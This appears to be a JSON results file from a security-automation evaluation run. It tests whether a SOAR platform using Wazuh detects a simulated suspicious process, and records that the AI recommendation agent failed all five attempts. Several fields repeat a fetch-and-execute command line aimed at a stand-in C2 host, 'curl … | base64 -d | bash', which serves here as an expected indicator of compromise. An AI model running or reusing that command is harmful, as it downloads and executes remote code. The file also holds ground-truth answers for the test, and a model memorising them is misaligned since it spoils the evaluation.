@@ -1,0 +1,313 @@
+{
+  "runLabel": "tc08-process-ioc-real-wazuh-20261002-run3",
+  "mode": "clean",
+  "evaluationType": "REAL_WAZUH",
+  "startedAt": "2026-10-02T08:49:25.762Z",
+  "finishedAt": "2026-10-02T09:00:43.643Z",
+  "groundTruthFrozenAt": "2026-10-02T08:49:19.699Z",
+  "groundTruthSha256": "e54d003515bdcb1915075ce5a80bccae634d534eb8a915485c2a501ec2b68319",
+  "groundTruthSource": "apps/backend/src/evaluation/groundTruthReal.ts",
+  "decisionMode": "approve",
+  "infrastructureEvents": [
+    {
+      "case": "TC-08",
+      "stage": "recommendation-generation",
+      "at": "2026-10-02T08:58:17.723Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 68,
+      "recovered": true
+    }
+  ],
+  "scoring": "deterministic (EvaluationService.evaluateCompliance) — no LLM judge",
+  "preflight": {
+    "checks": [
+      {
+        "name": "evaluation database",
+        "ok": true,
+        "detail": "connected to 'soar_tc08_eval' (must end with _eval; soar_platform is never touched)"
+      },
+      {
+        "name": "REHUNT_PROVIDER",
+        "ok": true,
+        "detail": "REHUNT_PROVIDER=wazuh — mock would make verification MOCK"
+      },
+      {
+        "name": "recommendation agent",
+        "ok": true,
+        "detail": "RECOMMENDATION_AGENT=llm (harness always builds LlmRecommendationAgent)"
+      },
+      {
+        "name": "AI orchestrator (eval instance)",
+        "ok": true,
+        "detail": "http://localhost:8001 -> {\"status\":\"ok\",\"service\":\"soar-ai-orchestrator\"}"
+      },
+      {
+        "name": "Wazuh Indexer + re-hunt provider",
+        "ok": true,
+        "detail": "WazuhRehuntAdapter health: reachable=true cluster=green indices=4 pattern=wazuh-alerts-4.x-*"
+      },
+      {
+        "name": "Wazuh manager API",
+        "ok": true,
+        "detail": "UP: analysisd, remoted, logcollector, integratord running · agents 2 active / 4 total (2 disconnected)"
+      },
+      {
+        "name": "Wazuh agent attack-endpoint",
+        "ok": true,
+        "detail": "ID: 009, Name: attack-endpoint, IP: any, Active"
+      },
+      {
+        "name": "custom rule 100310 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100320 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100330 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100340 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100350 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "Knowledge Base complete for ground truth",
+        "ok": true,
+        "detail": "11 playbooks, 26 MITRE techniques, 14 actions; all ground-truth references present"
+      }
+    ],
+    "kbGaps": [],
+    "env": {
+      "wazuhVersion": "WAZUH_VERSION=\"v4.9.2\" WAZUH_REVISION=\"40921\" WAZUH_TYPE=\"server\" ",
+      "wazuhAgent": "ID: 009, Name: attack-endpoint, IP: any, Active",
+      "wazuhManagerApi": {
+        "status": "UP",
+        "detail": "analysisd, remoted, logcollector, integratord running · agents 2 active / 4 total (2 disconnected)",
+        "latencyMs": 240
+      },
+      "indexer": {
+        "configured": true,
+        "reachable": true,
+        "indexPattern": "wazuh-alerts-4.x-*",
+        "clusterStatus": "green",
+        "alertIndices": 4
+      },
+      "aiOrchestrator": "http://localhost:8001",
+      "llm": {
+        "provider": "openrouter",
+        "model": "google/gemma-4-26b-a4b-it",
+        "note": "LLM_PROVIDER is defined twice in apps/ai-orchestrator/.env (openai-compatible, then openrouter); the last value is assumed to win"
+      },
+      "database": "soar_tc08_eval",
+      "verificationModeConfigured": "REAL_WAZUH (REHUNT_PROVIDER=wazuh)",
+      "recommendationAgent": "llm",
+      "node": "v24.19.0"
+    }
+  },
+  "labSetup": [
+    "attacker=172.19.0.7 endpoint=172.19.0.6 testserver=172.19.0.5"
+  ],
+  "cases": [
+    {
+      "caseId": "TC-08",
+      "attackType": "SUSPICIOUS_PROCESS_EXECUTION",
+      "attackName": "Suspicious Process",
+      "severity": "medium",
+      "risk": null,
+      "incidentId": "824e231e-1aa9-4976-bdb7-6c409af5f4e2",
+      "alertId": "b8988310-3ad1-49dc-8e5b-028d6d580d2f",
+      "investigationId": "264b4048-62b4-44fd-9598-a3fe771a3ff9",
+      "recommendationId": null,
+      "playbookCode": null,
+      "decisionId": null,
+      "responseTicketId": null,
+      "verificationId": null,
+      "recommendationStatus": null,
+      "compliance": null,
+      "recommendationCompliance": "NOT_EVALUATED",
+      "investigationStartAt": "2026-10-02T08:49:35.942Z",
+      "recommendationAt": null,
+      "decisionAt": null,
+      "investigationTimeSeconds": null,
+      "timeToDecisionSeconds": null,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": false,
+        "recommendationCreated": false,
+        "recommendationValidated": false,
+        "policyEvaluated": false,
+        "decisionCompleted": false,
+        "responseCompleted": false,
+        "verificationCompleted": false,
+        "rehuntExecuted": false
+      },
+      "workflowCompleted": false,
+      "finalStatus": "open",
+      "verificationMode": "NONE",
+      "verificationResult": null,
+      "rehuntRound": null,
+      "recommendationAttemptCount": 5,
+      "invalidOutputCount": 5,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-08",
+        "startedAt": "2026-10-02T08:49:25.767Z",
+        "endedAt": "2026-10-02T08:49:27.625Z",
+        "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.7",
+          "endpointIp": "172.19.0.6",
+          "testServerIp": "172.19.0.5",
+          "pid": "2079",
+          "exe": "/tmp/.cache/kworkerd",
+          "user": "www-data",
+          "sha256": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
+          "parentProcess": "tail",
+          "commandLine": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+        },
+        "notes": [
+          "Process is real (sleep renamed kworkerd, alive when inspected); the telemetry line is generated by the harness from /proc, in the auditd data.audit.* layout."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "XurN-6ABY5OrLJKz6cEB",
+        "alertId": "1790930969.120779",
+        "timestamp": "2026-10-02T08:49:29.024+0000",
+        "ruleId": "100330",
+        "level": 10,
+        "description": "VIGIX-EVAL: suspicious process executed from a world-writable path",
+        "mitre": [
+          "T1059.004"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": null,
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 3.26
+      },
+      "groundTruth": {
+        "caseId": "TC-08",
+        "ruleId": "100330",
+        "attackName": "Suspicious Process",
+        "attackType": "SUSPICIOUS_PROCESS_EXECUTION",
+        "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+        "simulation": "Real process /tmp/.cache/kworkerd (renamed sleep) as www-data plus a harmless 'curl | base64 -d | bash' pipeline against the test server; process telemetry read from /proc",
+        "expectedWazuh": {
+          "ruleId": "100330",
+          "level": 10,
+          "stockRule": false
+        },
+        "expectedSeverity": "medium",
+        "expectedMitre": [
+          "T1059.004"
+        ],
+        "expectedIocs": [
+          {
+            "type": "process",
+            "value": "/tmp/.cache/kworkerd"
+          },
+          {
+            "type": "command",
+            "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+          },
+          {
+            "type": "file",
+            "value": "/tmp/.cache/kworkerd"
+          },
+          {
+            "type": "hash",
+            "value": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64"
+          }
+        ],
+        "allowedActions": [
+          "ACT-KILL-PROCESS",
+          "ACT-QUARANTINE-FILE",
+          "ACT-BLOCK-HASH",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActions": [
+          "ACT-KILL-PROCESS",
+          "ACT-QUARANTINE-FILE"
+        ],
+        "expectedTargets": [
+          "/tmp/.cache/kworkerd",
+          "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
+          "attack-endpoint"
+        ],
+        "expectedEvidence": {
+          "host": "attack-endpoint",
+          "processName": "kworkerd",
+          "processPath": "/tmp/.cache/kworkerd",
+          "commandLine": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+          "parentProcess": null,
+          "user": "www-data",
+          "fileSha256": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
+          "timestamp": "event timestamp (alert.timestamp)"
+        },
+        "evidenceLimits": [
+          "parentProcess is null in the specification: the parent of the detached (setsid) process is read from the endpoint at run time (data.audit.parent) and recorded in the simulation facts, but its value is not fixed in advance.",
+          "commandLine is the parent shell pipeline; the process itself is 'sleep 40' renamed kworkerd (its own argv is not security-relevant).",
+          "Process name / PID are only in data.audit.* (data.process is object-mapped in the Wazuh index, so a scalar data.process cannot be indexed); the IOC extractor does not read data.audit.* (PSI-2), so ACT-KILL-PROCESS has no PROCESS_NAME target unless extraction is extended or an analyst adds it."
+        ],
+        "expectedPlaybook": "PB-SUSPICIOUS-PROCESS",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [],
+        "environmentNote": "ACT-KILL-PROCESS requires COMMAND_LINE evidence; a kill recommendation without a supported target/evidence must not appear."
+      },
+      "interventions": [],
+      "observations": [
+        "EXPECTED_IOC_MISSING (before any correction): command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+        "NO_VALID_RECOMMENDATION after 5 model attempts"
+      ],
+      "timeline": {
+        "simulationStart": "2026-10-02T08:49:25.767Z",
+        "wazuhAlertTimestamp": "2026-10-02T08:49:29.024+0000",
+        "alertReceivedByVigix": "2026-10-02T08:49:35.903Z",
+        "incidentOpened": "2026-10-02T08:49:35.936Z",
+        "investigationStart": "2026-10-02T08:49:35.942Z",
+        "recommendationCreated": null,
+        "irDecision": null,
+        "responseCompleted": null,
+        "verificationAt": null,
+        "detectionLatencySeconds": 3.26,
+        "ingestToRecommendationSeconds": null
+      },
+      "iocRecall": {
+        "expected": 4,
+        "found": 3,
+        "missing": [
+          "command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+        ]
+      },
+      "actionMatch": null,
+      "verificationDetail": null,
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    }
+  ]
+}
